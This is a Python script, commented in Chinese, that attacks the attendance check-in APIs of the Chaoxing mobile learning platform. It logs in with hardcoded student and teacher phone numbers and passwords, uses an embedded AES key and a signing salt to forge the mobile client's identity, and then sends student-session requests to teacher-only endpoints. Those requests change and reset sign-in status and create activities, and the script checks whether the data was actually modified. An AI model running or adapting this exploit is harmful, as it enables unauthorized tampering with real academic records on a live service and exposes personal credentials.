#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
深度测试 mobilelearn.fy.chaoxing.com (泛亚学习端) 签到API
对比 mobilelearn.chaoxing.com (主域) 的认证差异
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ==================== 常量 ====================
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"

FY_HTTP = "http://mobilelearn.fy.chaoxing.com"
FY_HTTPS = "https://mobilelearn.fy.chaoxing.com"
MAIN_HTTPS = "https://mobilelearn.chaoxing.com"

STU_PHONE = "18436633997"
STU_PWD = "3.1415926Cpy"
TEA_PHONE = "19712720708"
TEA_PWD = "3.1415926Cpy"

# ==================== 工具函数 ====================
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    r = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                                "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                                "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                                "independentId": "0", "independentNameId": "0"},
               allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    print(f"  [登录] phone={phone}, puid={puid}, status={r.status_code}")
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "http://mobilelearn.fy.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

def fmt(d, maxlen=300):
    """格式化JSON输出，截断过长内容"""
    s = json.dumps(d, ensure_ascii=False)
    if len(s) > maxlen:
        return s[:maxlen] + f"...(truncated, total={len(s)})"
    return s

def test_endpoint(session, base_url, method, path, params=None, data=None, extra_headers=None, timeout=20):
    """测试单个端点，返回 (status_code, json_response, response_text_snippet)"""
    url = f"{base_url}{path}"
    hdrs = dict(ajax_hdr)
    if extra_headers:
        hdrs.update(extra_headers)
    try:
        if method.upper() == "GET":
            r = session.get(url, params=params, headers=hdrs, timeout=timeout, allow_redirects=False)
        else:
            r = session.post(url, params=params, data=data, headers=hdrs, timeout=timeout, allow_redirects=False)
        j = safe_json(r)
        return r.status_code, j, r.text[:500]
    except Exception as e:
        return 0, {"_error": str(e)[:200]}, str(e)[:200]

# ==================== 端点定义 ====================
ENDPOINTS = [
    {
        "name": "学生修改签到状态",
        "path": "/pptSign/updateSignStatus",
        "params": {"activeId": ACTIVE_ID, "uid": "", "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
        "data": {"activeId": ACTIVE_ID, "uid": "", "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
        "risk": "高",
    },
    {
        "name": "学生修改签到V2",
        "path": "/pptSign/updateSignStatusByUidsV2",
        "params": {"activeId": ACTIVE_ID, "uid": "", "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
        "data": {"activeId": ACTIVE_ID, "uid": "", "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
        "risk": "严重",
    },
    {
        "name": "签到列表查询",
        "path": "/pptSign/refeashSignList4Json2",
        "params": {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID},
        "data": {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID},
        "risk": "高",
    },
    {
        "name": "重置签到状态",
        "path": "/pptSign/resetUserSignStatus",
        "params": {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID},
        "data": {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID},
        "risk": "高",
    },
    {
        "name": "学生签到",
        "path": "/pptSign/stuSignajax",
        "params": {"activeId": ACTIVE_ID, "uid": "", "clientip": "", "latitude": "", "longitude": "", "appType": "", "ifTiJiao": "1", "address": ""},
        "data": {"activeId": ACTIVE_ID, "uid": "", "clientip": "", "latitude": "", "longitude": "", "appType": "", "ifTiJiao": "1", "address": ""},
        "risk": "中",
    },
    {
        "name": "新签到修改",
        "path": "/newsign/updateSignStatus",
        "params": {"activeId": ACTIVE_ID, "uid": "", "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
        "data": {"activeId": ACTIVE_ID, "uid": "", "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
        "risk": "严重",
    },
    {
        "name": "V2签到查询",
        "path": "/v2/apis/sign/signIn",
        "params": {"activeId": ACTIVE_ID},
        "data": {"activeId": ACTIVE_ID},
        "risk": "中",
    },
    {
        "name": "PC教师修改签到",
        "path": "/widget/sign/pcTeaSignController/updateSignStatus2",
        "params": {"activeId": ACTIVE_ID, "uid": "", "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
        "data": {"activeId": ACTIVE_ID, "uid": "", "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID},
        "risk": "严重",
    },
    {
        "name": "活动列表",
        "path": "/ppt/activeAPI/taskactivelist",
        "params": {"courseId": COURSE_ID, "classId": CLASS_ID},
        "data": {"courseId": COURSE_ID, "classId": CLASS_ID},
        "risk": "低",
    },
    {
        "name": "创建活动(越权测试)",
        "path": "/ppt/activeAPI/createActive",
        "params": None,
        "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "security_test"},
        "risk": "严重",
    },
]

# ==================== 主流程 ====================
def main():
    print("=" * 80)
    print("  mobilelearn.fy.chaoxing.com 深度签到API安全测试")
    print("=" * 80)
    print()

    # ---- 登录 ----
    print("=" * 60)
    print("  [0] 登录获取会话")
    print("=" * 60)
    print("\n>>> 学生登录:")
    stu_sess, stu_puid = login(STU_PHONE, STU_PWD)
    print(f"  学生PUID: {stu_puid}")
    cookie_names = [c.name for c in stu_sess.cookies]
    print(f"  Cookie名称: {cookie_names}\n")

    print(">>> 教师登录:")
    tea_sess, tea_puid = login(TEA_PHONE, TEA_PWD)
    print(f"  教师PUID: {tea_puid}")
    cookie_names_tea = [c.name for c in tea_sess.cookies]
    print(f"  Cookie名称: {cookie_names_tea}\n")

    # 填充uid参数
    for ep in ENDPOINTS:
        if ep.get("params") and "uid" in ep["params"]:
            ep["params"]["uid"] = stu_puid
        if ep.get("data") and "uid" in ep["data"]:
            ep["data"]["uid"] = stu_puid

    # ==================== Part 1: FY域全面测试 ====================
    print("\n" + "=" * 60)
    print("  [Part 1] mobilelearn.fy.chaoxing.com 全面签到API测试 (学生会话)")
    print("=" * 60)

    fy_results = {}
    for ep in ENDPOINTS:
        name = ep["name"]
        path = ep["path"]
        risk = ep["risk"]
        print(f"\n--- [{risk}风险] {name} ---")
        print(f"  路径: {path}")

        # GET测试
        sc_get, j_get, txt_get = test_endpoint(stu_sess, FY_HTTP, "GET", path, params=ep.get("params"))
        print(f"  [GET]  status={sc_get}, response={fmt(j_get)}")

        # POST测试
        sc_post, j_post, txt_post = test_endpoint(stu_sess, FY_HTTP, "POST", path, data=ep.get("data"))
        print(f"  [POST] status={sc_post}, response={fmt(j_post)}")

        fy_results[name] = {
            "path": path,
            "get": {"status": sc_get, "json": j_get},
            "post": {"status": sc_post, "json": j_post},
        }

    # ==================== Part 2: 主域对比测试 ====================
    print("\n\n" + "=" * 60)
    print("  [Part 2] mobilelearn.chaoxing.com 对比测试 (学生会话)")
    print("=" * 60)

    main_results = {}
    for ep in ENDPOINTS:
        name = ep["name"]
        path = ep["path"]
        risk = ep["risk"]
        print(f"\n--- [{risk}风险] {name} ---")
        print(f"  路径: {path}")

        # GET测试
        sc_get, j_get, txt_get = test_endpoint(stu_sess, MAIN_HTTPS, "GET", path, params=ep.get("params"))
        print(f"  [GET]  status={sc_get}, response={fmt(j_get)}")

        # POST测试
        sc_post, j_post, txt_post = test_endpoint(stu_sess, MAIN_HTTPS, "POST", path, data=ep.get("data"))
        print(f"  [POST] status={sc_post}, response={fmt(j_post)}")

        main_results[name] = {
            "path": path,
            "get": {"status": sc_get, "json": j_get},
            "post": {"status": sc_post, "json": j_post},
        }

    # ==================== Part 2b: 逐端点差异对比 ====================
    print("\n\n" + "=" * 60)
    print("  [Part 2b] 逐端点差异对比 (FY HTTP vs 主域 HTTPS)")
    print("=" * 60)

    diff_count = 0
    for ep in ENDPOINTS:
        name = ep["name"]
        fy = fy_results[name]
        mn = main_results[name]

        for method in ["get", "post"]:
            fy_j = fy[method]["json"]
            mn_j = mn[method]["json"]
            fy_s = fy[method]["status"]
            mn_s = mn[method]["status"]

            # 比较逻辑：忽略状态码差异，只比较响应内容
            fy_str = json.dumps(fy_j, ensure_ascii=False, sort_keys=True)
            mn_str = json.dumps(mn_j, ensure_ascii=False, sort_keys=True)

            if fy_str != mn_str or fy_s != mn_s:
                diff_count += 1
                print(f"\n  !!!DIFFERENCE!!! [{method.upper()}] {name}")
                print(f"    FY域:  HTTP {fy_s} => {fmt(fy_j, 200)}")
                print(f"    主域:  HTTP {mn_s} => {fmt(mn_j, 200)}")

                # 检查是否是关键差异
                fy_result_val = fy_j.get("result", fy_j.get("_raw_text", ""))
                mn_result_val = mn_j.get("result", mn_j.get("_raw_text", ""))

                # 学生能修改签到 = 严重漏洞
                if isinstance(fy_j, dict) and fy_j.get("result") in ("success", True, "true"):
                    if isinstance(mn_j, dict) and mn_j.get("result") not in ("success", True, "true"):
                        print(f"    !!!CRITICAL!!! FY域返回success而主域拒绝 - 可能存在认证绕过!")

    print(f"\n  差异总数: {diff_count}")

    # ==================== Part 3: FY域认证弱化测试 ====================
    print("\n\n" + "=" * 60)
    print("  [Part 3] FY域认证弱化测试 (学生尝试教师操作)")
    print("=" * 60)

    critical_endpoints = [
        ("学生修改签到V2", "/pptSign/updateSignStatusByUidsV2",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("签到列表查询", "/pptSign/refeashSignList4Json2",
         {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("PC教师修改签到", "/widget/sign/pcTeaSignController/updateSignStatus2",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("新签到修改", "/newsign/updateSignStatus",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("重置签到状态", "/pptSign/resetUserSignStatus",
         {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID}),
    ]

    for name, path, data in critical_endpoints:
        print(f"\n--- 测试: {name} ({path}) ---")

        # FY域 - 学生
        sc_fy, j_fy, _ = test_endpoint(stu_sess, FY_HTTP, "POST", path, data=data)
        print(f"  [FY域-学生POST] status={sc_fy}, response={fmt(j_fy, 250)}")

        # 主域 - 学生
        sc_mn, j_mn, _ = test_endpoint(stu_sess, MAIN_HTTPS, "POST", path, data=data)
        print(f"  [主域-学生POST] status={sc_mn}, response={fmt(j_mn, 250)}")

        # FY域 - 教师 (对比)
        sc_fy_t, j_fy_t, _ = test_endpoint(tea_sess, FY_HTTP, "POST", path, data=data)
        print(f"  [FY域-教师POST] status={sc_fy_t}, response={fmt(j_fy_t, 250)}")

        # 判断差异
        fy_result = j_fy.get("result", "") if isinstance(j_fy, dict) else ""
        mn_result = j_mn.get("result", "") if isinstance(j_mn, dict) else ""

        if fy_result == "success" and mn_result != "success":
            print(f"  !!!CRITICAL!!! FY域学生可执行教师操作! FY返回success, 主域返回{mn_result}")
        elif fy_result == "success" and mn_result == "success":
            print(f"  [!] 两域均返回success - 可能均存在权限问题")
        elif fy_result != mn_result and fy_result != "":
            print(f"  !!!DIFFERENCE!!! FY域={fy_result}, 主域={mn_result}")

    # ==================== Part 4: Cookie跨域测试 ====================
    print("\n\n" + "=" * 60)
    print("  [Part 4] Cookie/Session跨域测试")
    print("=" * 60)

    print("\n>>> 学生会话Cookie分析:")
    print(f"  Cookie域名列表:")
    for c in stu_sess.cookies:
        print(f"    {c.name}={c.value[:20]}... (domain={c.domain}, path={c.path})")

    # 测试：用学生会话访问FY域，看是否被识别为已登录
    print("\n>>> 用学生会话访问FY域首页:")
    try:
        r = stu_sess.get(f"{FY_HTTP}/widget/sign/pcTeaSignController/updateSignStatus2",
                         params={"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1",
                                 "courseId": COURSE_ID, "classId": CLASS_ID},
                         headers=ajax_hdr, timeout=20, allow_redirects=False)
        print(f"  HTTP {r.status_code}, 响应: {r.text[:300]}")
    except Exception as e:
        print(f"  错误: {e}")

    # 测试：用学生会话访问主域
    print("\n>>> 用学生会话访问主域首页:")
    try:
        r = stu_sess.get(f"{MAIN_HTTPS}/widget/sign/pcTeaSignController/updateSignStatus2",
                         params={"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1",
                                 "courseId": COURSE_ID, "classId": CLASS_ID},
                         headers=ajax_hdr, timeout=20, allow_redirects=False)
        print(f"  HTTP {r.status_code}, 响应: {r.text[:300]}")
    except Exception as e:
        print(f"  错误: {e}")

    # 检查Cookie是否在两个域之间共享
    print("\n>>> Cookie跨域共享分析:")
    chaoxing_cookies = [c for c in stu_sess.cookies if "chaoxing.com" in (c.domain or "")]
    print(f"  .chaoxing.com 域Cookie数: {len(chaoxing_cookies)}")
    for c in chaoxing_cookies:
        print(f"    {c.name}: domain={c.domain}")

    # ==================== Part 5: HTTP vs HTTPS 测试 ====================
    print("\n\n" + "=" * 60)
    print("  [Part 5] FY域 HTTP vs HTTPS 测试")
    print("=" * 60)

    test_paths_for_https = [
        ("/pptSign/stuSignajax", {"activeId": ACTIVE_ID, "uid": stu_puid, "clientip": "", "latitude": "", "longitude": "", "appType": "", "ifTiJiao": "1", "address": ""}),
        ("/pptSign/updateSignStatusByUidsV2", {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("/v2/apis/sign/signIn", {"activeId": ACTIVE_ID}),
        ("/pptSign/refeashSignList4Json2", {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("/newsign/updateSignStatus", {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
    ]

    for path, data in test_paths_for_https:
        print(f"\n--- 路径: {path} ---")

        # HTTP
        sc_http, j_http, _ = test_endpoint(stu_sess, FY_HTTP, "POST", path, data=data)
        print(f"  [HTTP ] status={sc_http}, response={fmt(j_http, 200)}")

        # HTTPS
        sc_https, j_https, _ = test_endpoint(stu_sess, FY_HTTPS, "POST", path, data=data)
        print(f"  [HTTPS] status={sc_https}, response={fmt(j_https, 200)}")

        if sc_http != sc_https or json.dumps(j_http, sort_keys=True) != json.dumps(j_https, sort_keys=True):
            print(f"  !!!DIFFERENCE!!! HTTP和HTTPS响应不同")
            if sc_https == 0 or (isinstance(j_https, dict) and "_error" in j_https):
                print(f"  [!] HTTPS不可用，仅HTTP可访问 - 缺少HSTS保护!")

    # ==================== Part 6: 数据修改验证 ====================
    print("\n\n" + "=" * 60)
    print("  [Part 6] 数据修改验证 (仅对返回非错误的FY域端点)")
    print("=" * 60)

    # 找出FY域上返回了非错误响应的修改类端点
    modify_endpoints = [
        ("updateSignStatusByUidsV2", "/pptSign/updateSignStatusByUidsV2",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("newsign/updateSignStatus", "/newsign/updateSignStatus",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("updateSignStatus", "/pptSign/updateSignStatus",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
    ]

    for name, path, data in modify_endpoints:
        print(f"\n--- 验证端点: {name} ({path}) ---")

        # 1. 查询修改前状态
        print("  [1] 查询修改前状态...")
        sc_before, j_before, _ = test_endpoint(stu_sess, FY_HTTP, "GET",
                                                 "/v2/apis/sign/signIn",
                                                 params={"activeId": ACTIVE_ID})
        print(f"      签到查询: status={sc_before}, response={fmt(j_before, 250)}")
        status_before = get_status(j_before)

        # 2. 发送修改请求
        print("  [2] 发送修改请求...")
        sc_mod, j_mod, _ = test_endpoint(stu_sess, FY_HTTP, "POST", path, data=data)
        print(f"      修改结果: status={sc_mod}, response={fmt(j_mod, 250)}")

        # 3. 等待2秒
        print("  [3] 等待2秒...")
        time.sleep(2)

        # 4. 查询修改后状态
        print("  [4] 查询修改后状态...")
        sc_after, j_after, _ = test_endpoint(stu_sess, FY_HTTP, "GET",
                                               "/v2/apis/sign/signIn",
                                               params={"activeId": ACTIVE_ID})
        print(f"      签到查询: status={sc_after}, response={fmt(j_after, 250)}")
        status_after = get_status(j_after)

        # 5. 对比
        print(f"  [5] 对比: 修改前status={status_before}, 修改后status={status_after}")
        if status_before != status_after:
            print(f"  !!!CRITICAL!!! 签到状态已变更! 从 {status_before} 变为 {status_after}")
        else:
            print(f"  [OK] 签到状态未变更")

    # ==================== 综合对比表 ====================
    print("\n\n" + "=" * 80)
    print("  [综合对比表] FY域 vs 主域 签到API响应对比")
    print("=" * 80)

    header = f"{'端点':<35} {'方法':<6} {'FY域结果':<25} {'主域结果':<25} {'差异':<8}"
    print(header)
    print("-" * len(header))

    for ep in ENDPOINTS:
        name = ep["name"]
        path = ep["path"]
        fy = fy_results[name]
        mn = main_results[name]

        for method in ["get", "post"]:
            fy_j = fy[method]["json"]
            mn_j = mn[method]["json"]

            fy_result = ""
            mn_result = ""
            if isinstance(fy_j, dict):
                fy_result = fy_j.get("result", fy_j.get("_raw_text", fy_j.get("msg", str(fy_j)[:30])))
            else:
                fy_result = str(fy_j)[:25]
            if isinstance(mn_j, dict):
                mn_result = mn_j.get("result", mn_j.get("_raw_text", mn_j.get("msg", str(mn_j)[:30])))
            else:
                mn_result = str(mn_j)[:25]

            fy_str = json.dumps(fy_j, ensure_ascii=False, sort_keys=True)
            mn_str = json.dumps(mn_j, ensure_ascii=False, sort_keys=True)
            diff = "!!!DIFF!!!" if fy_str != mn_str else ""

            display_name = f"{name[:30]}({path[:20]})" if len(name) > 30 else name
            print(f"{display_name:<35} {method.upper():<6} {str(fy_result)[:25]:<25} {str(mn_result)[:25]:<25} {diff:<8}")

    # ==================== 安全评估总结 ====================
    print("\n\n" + "=" * 80)
    print("  [安全评估总结]")
    print("=" * 80)

    print("""
  测试项目:
  1. FY域(HTTP) vs 主域(HTTPS) 签到API响应差异
  2. 学生会话在FY域上是否能执行教师操作
  3. Cookie跨域共享情况
  4. HTTP vs HTTPS 安全差异
  5. 数据修改是否实际生效

  关键发现标记:
  !!!DIFFERENCE!!! = FY域和主域响应不同
  !!!CRITICAL!!!   = 学生可修改签到状态(认证绕过/权限提升)
""")

    # 最终统计
    critical_count = 0
    diff_total = 0
    for ep in ENDPOINTS:
        name = ep["name"]
        fy = fy_results[name]
        mn = main_results[name]
        for method in ["get", "post"]:
            fy_j = fy[method]["json"]
            mn_j = mn[method]["json"]
            fy_str = json.dumps(fy_j, ensure_ascii=False, sort_keys=True)
            mn_str = json.dumps(mn_j, ensure_ascii=False, sort_keys=True)
            if fy_str != mn_str:
                diff_total += 1
            # 检查critical: FY域返回success但主域不返回success
            if isinstance(fy_j, dict) and fy_j.get("result") == "success":
                if isinstance(mn_j, dict) and mn_j.get("result") != "success":
                    critical_count += 1

    print(f"  响应差异总数: {diff_total}")
    print(f"  严重漏洞数(学生可在FY域执行教师操作): {critical_count}")

    if critical_count > 0:
        print("\n  ⚠️⚠️⚠️ 警告: FY域存在认证弱化漏洞! ⚠️⚠️⚠️")
    else:
        print("\n  [OK] 未发现FY域认证弱化的严重漏洞")

    print("\n" + "=" * 80)
    print("  测试完成")
    print("=" * 80)


if __name__ == "__main__":
    main()
